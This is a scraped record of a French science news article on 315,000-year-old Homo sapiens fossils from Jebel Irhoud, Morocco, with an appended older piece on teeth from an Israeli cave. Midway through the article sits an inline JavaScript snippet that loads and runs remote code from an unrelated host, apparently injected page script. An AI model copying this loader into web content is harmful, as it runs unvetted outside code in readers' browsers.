{"title": "Homo sapiens : l'Homme aurait 100.000 ans de plus qu'on ne le pensait", "newspaper": "Futura Sciences", "author": ["Nathalie Mayer"], "date_publi": "2017-06-08", "content": "Des scientifiques ont mis au jour, sur un site marocain, des restes d' Homo sapiens  datant de plus de 300.000 ans, alors que les plus anciens fossiles connus dataient d'environ 200.000 ans. De quoi remettre en cause nos idees sur l'origine geographique et l'evolution de l'humanite. Ce qu'il faut retenir Des restes de cinq  Homo sapiens , dates, avec precision, de 315.000 ans, ont ete decouverts sur le site de Jebel Irhoud au Maroc. Cette decouverte fondamentale deplace, dans le temps et dans l'espace, l'origine de l'humanite. Ce qui differencie morphologiquement ces  Homo sapiens  anciens de l'Homme moderne, c'est surtout la boite cranienne plus allongee. Notre espece n'a pas 200 000 ans mais 300 000 !                       Au Maroc, une equipe internationale menee par Jean-Jacques Hublin (du College de France et de l'Institut Max Planck) a decouvert les restes fossiles de cinq individus qui appartiennent a notre espece. Mais ils datent de 300.000 ans, alors que les plus vieux Homo sapiens connus remontaient a 195.000 ans. De plus, les premiers Hommes semblaient etre apparus en Afrique de l'est. La decouverte contraint a revisiter l'histoire de l'espece humaine et, de plus, montre que, depuis ses premiers representants, c'est la boite cranienne, donc le cerveau ou au moins le cervelet, qui a le plus evolue.                                       Une equipe internationale de chercheurs, dirigee par Jean-Jacques Hublin, paleoanthropologue au College de France et a l' Institut Max Planck  (Allemagne), et Abdelouahed Ben-Ncer de l'Institut national d'archeologie et de patrimoine de Rabat (Maroc), vient de mettre au jour des os fossilises d' Homo sapiens . Jusque-la, rien d'exceptionnel. Sauf que ces os-la ont pu etre dates de maniere fiable. Et le resultat est des plus surprenants : ces  fossiles  sont vieux de 315.000 ans +/-34.000. Un age plus que respectable et un lieu geographique etonnant lui aussi : le site paleolithique de Jebel Irhoud, au Maroc. De quoi remettre en question l'histoire etablie de l' evolution de l'humanite  a partir de l'est africain. Cette decouverte a fait l'objet de deux articles dans la revue  Nature  et a ete presentee dans un  communique du College de France . \" Homo sapiens  occupait deja l'Afrique toute entiere il y a plus de 300.000 ans. Jusqu'ici, la plus ancienne trace d' Homo sapiens  avait ete relevee en Ethiopie, sur le site d'Omo Kibish (voir le lien ci-dessous) et remontait a 195.000 ans.  << Nous avions imagine cette region comme etant le berceau de l'humanite. La decouverte d'un fossile plus ancien au Maroc suggere qu' Homo sapiens  occupait deja l'Afrique toute entiere il y a plus de 300.000 ans >> , conclut Jean-Jacques Hublin. Voir aussi : Homo sapiens plus vieux de 35.000 ans Le crane des fossiles de Jebel Irhoud ressemble beaucoup, par la face et la dentition, aux Hommes modernes. En revanche, la forme du crane est un peu differente. (c) Philipp Gunz, MPI EVA Leipzig, CC by-SA 2.0                       Jebel Irhoud : uns site archeologique exceptionnel Le site de Jebel Irhoud etait deja connu depuis le debut des annees 1960 pour receler des  fossiles humains  et des outils, initialement attribues a l'Homme de Neandertal et, surtout, dates avec une gradne imprecision. Mais le projet mene par l'Institut Max Planck et l'Institut national d'archeologie et de patrimoine de Rabat a permis de mettre au jour de nouvelles pieces, plus anciennes. En tout, le site en a fourni 22. Parmi elles, des cranes, des dents et des os longs ayant appartenu a au moins cinq individus (trois adultes, un adolescent et un enfant).  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Ils ont pu etre precisement dates par la methode de la thermoluminescence appliquee a des morceaux de silex brules associes aux fossiles. Et les resultats obtenus ont ete confirmes par une autre technique, celle de la resonance de spin electronique, appliquee a une mandibule, qui a donne 286.000 ans +/- 32.000. Les fossiles humains -- ici, au centre de l'image, dans un ton brun legerement plus jaune, le sommet ecrase d'un crane humain et juste au-dessus, un femur partiel -- trouves sur le site de Jebel Irhoud au Maroc ont autour de 315.000 ans. (c) Steffen Schatz, MPI EVA Leipzig, CC by-SA 2.0                               Une decouverte qui bouleverse l'histoire de l'humanite La  datation des os  semble tres fiable. Et les chercheurs n'ont aucun doute non plus sur le fait qu'il s'agit bien de restes d' Homo sapiens . Car les etudes par tomographie informatisee et les analyses statistiques sur des centaines de details morphologiques montrent que ces individus n'etaient ni des Neandertaliens ni des  Homo erectus . Autre information importante : si le visage et les dents de ces Hommes-la ressemblent a s'y meprendre aux notres, leur  boite cranienne  est plus allongee que celle des Hommes modernes. La forme globale de l'endocrane semble plus primitive et certainement differente aussi de celle de Neandertal ou d' Homo erectus . Des observations qui indiquent que la forme actuelle de la face humaine est apparue tres tot dans l'histoire de l'humanite, mais que celle du crane a davantage evolue. Le cervelet de ces anciens humains semble plus petit que le notre. Ces decouvertes corroborent par ailleurs l'interpretation qui avait ete faite du crane partiel decouvert a Florisbad, en Afrique du Sud, en 1932. Un crane date de 260.000 ans et deja soupconne etre celui d'un representant precoce d' Homo sapiens . De quoi, tout de meme, compliquer un peu l'histoire de l'evolution de notre  espece . Elle se serait en effet jouee sur l'ensemble du continent africain et plus seulement sur sa partie est. Ainsi, les tout premiers Hommes auraient pu se disseminer a partir et sur plusieurs regions du continent africain simultanement. Pour en savoir plus Homo sapiens a-t-il 400.000 ans ? Article de Jean-Luc Goudet paru le 30/12/2010 En Israel, des archeologues ont decouvert huit dents semblant appartenir a  Homo sapiens  dans une couche datee de 200.000 a 400.000 ans.  Or , les plus anciens fossiles humains retrouves jusqu'ici datent de 200.000 ans et se trouvent en Afrique de l'Est... Depuis plusieurs annees, une equipe d'archeologues fouille la grotte Qessem, a l'est de Tel-Aviv, et y a decouvert plusieurs dents, la premiere en 2006. Les chercheurs en ont trouvees depuis plusieurs autres, eparpillees dans une couche de terrain datee de 200.000 a 400.000 ans avant notre ere. Ces  huit dents  presentent de <<  fortes affinites  >> avec celles d' Homo sapiens , d'apres l'equipe, co-dirigee par  Avi Gopher , de l'Institut d'archeologie de l'universite de Tel Aviv, qui vient de publier ses resultats dans la revue  American Journal of Physical Anthropology . De plus, <<  l'examen des  stalagmites  et  stalactites , ainsi que d'autres materiaux decouverts sur place, indiquent que cette caverne a commence a etre utilisee il y a 400.000 ans  >> a explique a l'AFP. Or, les plus anciens  fossiles connus de l'espece   Homo sapiens  datent de 200.000 et ont ete trouves en Ethiopie. A confirmer... La decouverte semble donc de premiere importance et pourrait imposer de revoir notre vision de l'apparition de l'espece humaine. Mais il reste a confirmer ces resultats, d'abord pour demontrer que ces dents appartiennent bien a des  Homo sapiens . Elles pourraient en effet tout aussi bien provenir d'ancetres de notre espece, voire d'une lignee particuliere de neandertaliens, comme l'a souligne Rolf Quam, l'un des co-auteurs de l'article scientifique, ajoutant que cette region, a la frontiere de l'Afrique et si proche de l'Europe, a vu passer durant de tres longues periodes les migrations de la famille humaine. ", "theme": "sciences"}